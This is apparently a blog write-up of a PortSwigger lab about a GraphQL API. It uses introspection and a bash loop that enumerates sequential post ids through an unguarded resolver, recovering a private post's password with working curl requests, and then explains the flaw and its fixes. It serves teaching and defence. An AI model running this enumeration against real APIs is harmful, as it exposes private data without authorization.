---
layout: post
title: "PortSwigger: Accessing Private GraphQL Posts"
date: 2027-10-21 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, GraphQL]
tags: [portswigger, graphql, access-control, idor, information-disclosure, introspection, cwe-285]
---

A GraphQL blog hides its private posts from the public listing — but the API also exposes a second query that fetches any post by id, and that query forgot to check who's asking. Combine that with introspection (which advertises a `postPassword` field) and sequential integer ids, and reading the hidden post is a single request. This is [CWE-285](https://cwe.mitre.org/data/definitions/285.html), Improper Authorization, layered on classic IDOR and information disclosure.

## Overview

The homepage renders posts with one GraphQL query, `getAllBlogPosts`, which carefully returns only the public posts. But the schema also offers `getBlogPost(id)` — fetch a single post by its numeric id — and *that* resolver applies no authorization check at all. The privacy filter was bolted onto the listing, not onto the posts themselves.

## Finding the endpoint

PortSwigger serves GraphQL at `/graphql/v1`, not the more common `/graphql` (which returns 404 here). Probe a few paths and confirm with a trivial query:

```bash
curl -s -X POST "https://<lab-id>.web-security-academy.net/graphql/v1" \
  -H 'Content-Type: application/json' -d '{"query":"{__typename}"}'
# {"data":{"__typename":"query"}}
```

## Introspection: what does the schema expose?

GraphQL APIs can describe their own schema. With introspection left enabled, we ask for the queries and the fields of a blog post:

```bash
curl -s -X POST "https://<lab-id>.web-security-academy.net/graphql/v1" \
  -H 'Content-Type: application/json' \
  -d '{"query":"query{__schema{types{name fields{name args{name}}}}}"}'
```

Two things jump out:

- The `query` type has `getAllBlogPosts()` **and** `getBlogPost(id)`.
- The `BlogPost` type exposes `isPrivate` and `postPassword` fields — both freely selectable.

The schema just told us a sensitive field exists and named the query that returns a single post by id.

## Finding the hidden post

List the public ids first:

```bash
curl -s -X POST ".../graphql/v1" -H 'Content-Type: application/json' \
  -d '{"query":"query{getAllBlogPosts{id title}}"}'
```

That returns ids **1, 2, 4, 5**. Id 3 is missing — a strong hint it's the private one. Sweep the per-object resolver across ids and select the sensitive fields:

```bash
for i in $(seq 1 10); do
  curl -s -X POST ".../graphql/v1" -H 'Content-Type: application/json' \
    -d "{\"query\":\"query{getBlogPost(id: $i){id title isPrivate postPassword}}\"}"; echo
done
```

Id 3 answers:

```json
{"data":{"getBlogPost":{"id":3,"title":"Grandma's on the net","isPrivate":true,"postPassword":"inayi8x855y9v5rwtq5hvbrvueur637w"}}}
```

The post hidden from the listing is fully readable through the unguarded single-object resolver — password included.

## Solving

Submit the recovered password:

```bash
curl -s -X POST ".../submitSolution" -d 'answer=inayi8x855y9v5rwtq5hvbrvueur637w'
# {"correct":true}
```

The lab flips to **Solved**.

## Why it worked

Access control was enforced on the *list* of posts (`getAllBlogPosts` filters out private ones) but not on the *individual post* resolver (`getBlogPost(id)`). The per-object query is an equally valid front door, and because ids are small sequential integers, an attacker just enumerates them. Introspection made it effortless by advertising both the query and the sensitive `postPassword` field.

- **CWE-285 — Improper Authorization:** the per-object resolver performs no access check.
- **CWE-639 — IDOR:** sequential ids enumerate hidden records.
- **CWE-200 — Information disclosure:** the schema exposes `postPassword` and introspection advertises it.

## The fix

- Enforce object-level authorization in **every** resolver — the single-object resolver must apply the same visibility check as the list, throwing a forbidden error when an unauthorized caller requests a private post.
- Remove or guard sensitive fields (`postPassword`) with field-level access control so they can never be selected without authorization.
- Disable introspection in production, and use unguessable (UUID) ids instead of sequential integers so the object space can't be swept.
